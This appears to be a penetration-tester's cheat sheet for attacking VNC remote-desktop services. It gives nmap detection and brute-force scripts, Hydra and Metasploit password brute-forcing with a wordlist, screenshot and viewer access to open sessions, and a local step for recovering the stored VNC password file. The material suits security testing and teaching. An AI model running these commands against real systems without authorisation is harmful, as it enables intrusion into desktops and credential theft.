## Detection

### nmap
```
nmap -sV -p 5900-5910 <TARGET_IP>

# Identify VNC auth type and basic info
nmap -p 5900 --script vnc-info <TARGET_IP>

# Check for weak/no authentication
nmap -p 5900 --script vnc-auth <TARGET_IP>

# Brute-force VNC password
nmap -p 5900 --script vnc-brute <TARGET_IP>
```

- Default VNC display `:0` → port `5900`
- `:1` → 5901, etc.

***

## Enumeration

### Banner Grabbing
```
nc <TARGET_IP> 5900
```

- Often reveals VNC version (e.g., RFB protocol version)

### vncsnapshot (Screenshot)
```
vncsnapshot <TARGET_IP>:0 screenshot.jpg
```

- Quickly grabs remote desktop image if accessible

### vncviewer
```
vncviewer <TARGET_IP>:0
```

- Attempts interactive access to the VNC session

### metasploit scanner
```
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <TARGET_IP>
run
```

***

## Post-Exploitation

### Connect with Password
```
vncviewer <TARGET_IP>:0
```

- Prompts for password if required

### Use Discovered Password
```
vncviewer <TARGET_IP>:0 -passwd /path/to/passfile
```

### Dump Password Hash (Local Access Required)
```
strings ~/.vnc/passwd
```

- VNC passwords are DES-encrypted and weak (max 8 chars)

### Reverse VNC (if target supports it)
```
vncviewer -listen 5900
```

- Waits for incoming VNC connection from compromised host

***

## Attacks

### Brute Force with Hydra
```
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt <TARGET_IP> vnc
```

### Metasploit Brute Force
```
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <TARGET_IP>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

***

## Exploitation - Metasploit

### VNC Login Scanner
```
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <TARGET_IP>
set STOP_ON_SUCCESS true
run
```

### VNC None Auth (No Password)
```
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <TARGET_IP>
run
```
